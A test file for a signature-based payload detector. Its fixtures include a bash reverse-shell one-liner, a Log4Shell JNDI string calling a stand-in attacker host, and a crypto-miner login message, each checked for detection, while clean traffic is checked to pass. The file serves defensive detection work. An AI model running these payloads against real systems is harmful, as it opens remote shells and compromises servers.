import { PayloadAnalyst } from '../src/core/payloadAnalyst.js';

describe('PayloadAnalyst (YARA-lite)', () => {
    const analyst = new PayloadAnalyst();

    test('detects bash reverse shell', () => {
        const data = 'some junk; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; more junk';
        const matches = analyst.analyze(data);
        expect(matches.length).toBe(1);
        expect(matches[0].rule).toBe('Reverse Shell');
        expect(matches[0].severity).toBe('critical');
    });

    test('detects Log4Shell', () => {
        const data = '${jndi:ldap://attacker.com/a}';
        const matches = analyst.analyze(data);
        expect(matches[0].rule).toBe('Log4Shell Attempt');
    });

    test('detects CryptoMiner stratum', () => {
        const data = '{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"xxxx","pass":"x","agent":"xmrig/6.10.0"}}';
        const matches = analyst.analyze(data);
        expect(matches[0].rule).toBe('CryptoMiner Signature');
    });

    test('ignores clean data', () => {
        const data = 'GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n';
        const matches = analyst.analyze(data);
        expect(matches.length).toBe(0);
    });

    test('caps data length for safety', () => {
        const large = 'A'.repeat(20000);
        const matches = analyst.analyze(large);
        expect(matches.length).toBe(0);
    });
});
